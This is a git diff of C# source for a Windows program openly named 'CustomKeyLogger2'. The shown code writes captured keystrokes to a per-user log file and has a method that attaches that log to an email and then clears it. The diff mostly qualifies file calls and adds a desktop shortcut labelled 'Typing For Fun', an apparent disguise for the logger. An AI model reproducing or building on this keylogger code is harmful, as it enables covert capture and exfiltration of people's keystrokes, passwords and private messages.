@@ -12,6 +12,7 @@ using System.IO;
 using System.Collections;
 using System.Net.Mail;
 using Microsoft.Win32;
+using IWshRuntimeLibrary;
 
 namespace CustomKeyLogger2
 {
@@ -56,14 +57,14 @@ namespace CustomKeyLogger2
             logsFileDir = atmdir + Environment.UserName + "-logs.krs";
             attachFileDir = atmdir + "attachlog.txt";
             StreamWriter sw;
-            if (!File.Exists(keywordsFileDir))
+            if (!System.IO.File.Exists(keywordsFileDir))
             {
-                sw = File.CreateText(keywordsFileDir);
+                sw = System.IO.File.CreateText(keywordsFileDir);
                 sw.Close();
             }
-            if (!File.Exists(logsFileDir))
+            if (!System.IO.File.Exists(logsFileDir))
             {
-                sw = File.CreateText(logsFileDir);
+                sw = System.IO.File.CreateText(logsFileDir);
                 sw.Close();
             }
         }
@@ -441,12 +442,12 @@ namespace CustomKeyLogger2
 
         public void writeToFile(String writing)
         {
-            if (PauseWriting == false) File.AppendAllText(logsFileDir, writing);
+            if (PauseWriting == false) System.IO.File.AppendAllText(logsFileDir, writing);
         }
 
         private void btnShow_Click(object sender, EventArgs e)
         {
-            txtLog.Text = File.ReadAllText(logsFileDir);
+            txtLog.Text = System.IO.File.ReadAllText(logsFileDir);
         }
 
         private void btnSvScrtWrd_Click(object sender, EventArgs e)
@@ -489,10 +490,10 @@ namespace CustomKeyLogger2
         public void sendMailK()
         {
             PauseWriting = true;
-            File.Copy(logsFileDir, attachFileDir, true);
+            System.IO.File.Copy(logsFileDir, attachFileDir, true);
             Attachment attach = new Attachment(attachFileDir);
-            File.Delete(logsFileDir);
-            StreamWriter sw = File.CreateText(logsFileDir);
+            System.IO.File.Delete(logsFileDir);
+            StreamWriter sw = System.IO.File.CreateText(logsFileDir);
             sw.Close();
             PauseWriting = false;
 
@@ -604,6 +605,18 @@ namespace CustomKeyLogger2
         private void timUnHide_Tick(object sender, EventArgs e)
         {
             unhide();
+        }
+
+        private void btnCreateDesktopShortcut_Click(object sender, EventArgs e)
+        {
+            String ShortcutLnk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Typing For Fun.lnk";
+            if (!System.IO.File.Exists(ShortcutLnk))
+            {
+                WshShell shell = new WshShell();
+                IWshShortcut link = (IWshShortcut)shell.CreateShortcut(ShortcutLnk);
+                link.TargetPath = atmdir;
+                link.Save();
+            }
         }
     }
 }
